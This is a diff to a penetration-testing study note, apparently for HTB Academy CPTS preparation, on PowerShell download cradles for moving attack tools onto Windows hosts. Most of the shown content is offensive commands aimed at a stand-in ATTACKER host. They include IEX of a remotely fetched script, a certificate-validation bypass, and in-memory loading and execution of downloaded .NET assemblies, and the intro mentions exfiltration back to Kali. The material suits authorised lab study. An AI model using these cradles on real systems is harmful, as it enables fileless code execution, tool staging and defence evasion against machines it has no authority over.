@@ -4,6 +4,11 @@
 
 Windows-native PowerShell download and upload methods. No external tools required — everything runs with built-in .NET classes. Essential for Windows file transfer when certutil is blocked or you need more flexibility. Covers download cradles for tools, in-memory execution, and exfiltration back to Kali.
 
+**Source:** Built into Windows (`powershell.exe` — Windows PowerShell 5.1 on every modern host; `pwsh` = PowerShell 7+ only if separately installed)
+**Kali HTTP server:** `python3 -m http.server 8080` (see [[Tools/File Transfer/python-http-server|python-http-server]])
+
+> [!warning] **Know your shell — 5.1 vs 7+.** The default Windows shell is **Windows PowerShell 5.1**, which behaves differently from PowerShell 7 (`pwsh`). Several convenience flags below (`-SkipCertificateCheck`) exist **only in 7+** and error out in 5.1; over HTTPS, 5.1 also defaults to old TLS. Assume you're in 5.1 unless you've confirmed otherwise (`$PSVersionTable.PSVersion`).
+
 ---
 
 ## Download — WebClient (Most Compatible)
@@ -21,8 +26,13 @@ $wc.DownloadFile('http://ATTACKER/tool.exe', 'C:\Windows\Temp\tool.exe')
 # DownloadString — in-memory execution (no disk write)
 IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
 
-# Bypass TLS/SSL errors
+# Bypass self-signed / untrusted cert errors
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+(New-Object Net.WebClient).DownloadFile('https://ATTACKER/tool.exe', 'C:\Temp\tool.exe')
+
+# Force TLS 1.2 — REQUIRED on Win7/2008/2012 (.NET defaults to TLS 1.0 there,
+# so HTTPS to a modern server fails with "Could not create SSL/TLS secure channel")
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 (New-Object Net.WebClient).DownloadFile('https://ATTACKER/tool.exe', 'C:\Temp\tool.exe')
 ```
 
@@ -37,15 +47,19 @@ Invoke-WebRequest -Uri 'http://ATTACKER/tool.exe' -OutFile 'C:\Windows\Temp\tool
 # Short alias
 iwr http://ATTACKER/tool.exe -OutFile C:\Windows\Temp\tool.exe
 
-# Skip SSL check
+# Skip SSL check — PowerShell 7+ ONLY. In 5.1 this errors ("parameter cannot be found");
+# use the ServicePointManager callback from the WebClient section instead.
 iwr https://ATTACKER/tool.exe -OutFile C:\Temp\tool.exe -SkipCertificateCheck
 
 # With headers
 iwr http://ATTACKER/tool.exe -OutFile C:\Temp\tool.exe -Headers @{"Authorization"="Bearer TOKEN"}
 
-# UseBasicParsing (avoids IE engine dependency — use when no GUI session)
+# UseBasicParsing — REQUIRED in 5.1 when run as SYSTEM / fresh profile (no IE engine
+# configured), otherwise iwr hangs or throws. Harmless (deprecated no-op) in 7+.
 iwr http://ATTACKER/tool.exe -OutFile C:\Temp\tool.exe -UseBasicParsing
 ```
+
+> [!tip] **Speed: kill the progress bar.** In Windows PowerShell 5.1, `Invoke-WebRequest -OutFile` renders a byte-by-byte progress bar that makes large transfers **10–50× slower**. Set `$ProgressPreference = 'SilentlyContinue'` first — a multi-MB tool that crawls for minutes then completes in seconds. `WebClient.DownloadFile` doesn't have this problem, so it's the better choice for big files on 5.1.
 
 ---
 
@@ -65,9 +79,12 @@ IEX (iwr http://ATTACKER/script.ps1 -UseBasicParsing)
 $c = (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')
 IEX $c
 
-# Load DLL/assembly into memory
-$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER/tool.dll')
-[System.Reflection.Assembly]::Load($bytes)
+# Load .NET assembly into memory (works for a managed EXE/DLL, not a native binary)
+$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER/tool.exe')
+$asm = [System.Reflection.Assembly]::Load($bytes)
+# Load() alone only maps it — you still have to invoke the entry point to run it:
+$asm.EntryPoint.Invoke($null, (,[string[]]@('arg1','arg2')))   # Main(string[] args)
+# $asm.EntryPoint.Invoke($null, $null)                          # Main() with no args
 ```
 
 ---
@@ -176,6 +193,10 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 
 ---
 
+> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]] (CPTS v2) for the full transfer workflow and Kali/Linux side. LOLBin alternatives when PowerShell is restricted: [[Tools/File Transfer/certutil|certutil]], [[Tools/File Transfer/SMBserver|impacket-smbserver]]. Serve the files from [[Tools/File Transfer/python-http-server|python-http-server]].
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-28*
+*Model: claude-opus-5*
